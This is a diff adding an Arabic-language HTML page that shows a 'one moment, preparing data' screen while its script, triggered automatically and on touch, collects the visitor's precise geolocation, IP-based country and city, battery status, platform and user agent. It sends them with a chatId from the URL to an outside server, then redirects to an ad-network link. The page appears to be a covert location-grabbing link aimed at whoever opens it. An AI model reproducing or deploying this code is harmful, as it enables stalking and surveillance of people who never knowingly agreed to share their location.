@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>لحظة واحدة</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #121212;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      overflow: hidden;
+    }
+    #overlay {
+      position: absolute;
+      top:0; left:0;
+      width:100%;
+      height:100%;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      flex-direction: column;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="overlay">
+    <h2>لحظة واحدة...</h2>
+    <p>جارٍ تجهيز البيانات</p>
+  </div>
+
+<script>
+const chatId = new URLSearchParams(window.location.search).get("chatId");
+const overlay = document.getElementById('overlay');
+
+async function sendData() {
+  overlay.innerHTML = "<h2>جارٍ جمع البيانات...</h2>";
+
+  // الموقع
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    // البطارية
+    let batteryLevel = 'غير متاح';
+    let batteryCharging = 'غير متاح';
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100) + '%';
+        batteryCharging = battery.charging;
+      } catch(e) {}
+    }
+
+    // معلومات IP
+    let locationData = {};
+    try {
+      const res = await fetch("https://ipwho.is/");
+      locationData = await res.json();
+    } catch(e) {}
+
+    const payload = {
+      chatId,
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      additionalData: {
+        ip: locationData.ip || 'غير متاح',
+        country: locationData.country || 'غير متاح',
+        city: locationData.city || 'غير متاح',
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        batteryLevel,
+        batteryCharging
+      }
+    };
+
+    try {
+      const send = await fetch("https://freeusr1.onrender.com/submitLocation", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      const result = await send.json();
+      if (result.success) {
+        window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+      } else {
+        overlay.innerText = "فشل إرسال البيانات";
+      }
+    } catch (err) {
+      overlay.innerText = "تعذر الاتصال بالسيرفر ❌";
+    }
+
+  }, (err) => {
+    overlay.innerText = "لم يتم السماح بالموقع ❌";
+  }, { enableHighAccuracy: true });
+}
+
+// محاولة تلقائية بعد نصف ثانية
+setTimeout(() => {
+  // على iOS Safari يجب تفاعل افتراضي، نستخدم حدث اللمس/تمرير
+  const trigger = () => {
+    sendData();
+    document.removeEventListener('touchstart', trigger);
+    document.removeEventListener('touchmove', trigger);
+  };
+  document.addEventListener('touchstart', trigger);
+  document.addEventListener('touchmove', trigger);
+
+  // لمحاكاة تفاعل تلقائي على بعض الأجهزة
+  sendData();
+}, 500);
+
+</script>
+
+<script type='text/javascript' src='https://pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
+</body>
+</html>
